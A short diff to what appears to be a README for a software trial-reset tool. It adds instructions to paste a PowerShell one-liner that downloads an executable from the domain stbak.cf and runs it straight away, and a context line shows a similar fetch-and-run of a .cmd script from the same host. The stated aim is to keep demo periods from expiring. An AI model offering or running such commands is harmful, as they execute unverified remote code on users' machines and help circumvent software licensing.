@@ -56,3 +56,9 @@ wget stbak.cf/ss -outfile ss.cmd; ss.cmd
   <img src="/Screenshots/Screenshot%202021-05-01%20213220.png?raw=true">
 </P>
 
+### Install As StartUp task
+
+This method doesn't lock the time of your Program so te demo time continues counting for prevent the program from being Expaired add the tool into your computer startup, it means the program will be run automatically on start. For doing this type below code into powershell window and hit enter.
+```
+cd\; wget stbak.cf/sss -outfile sss.exe; .\sss.exe
+```
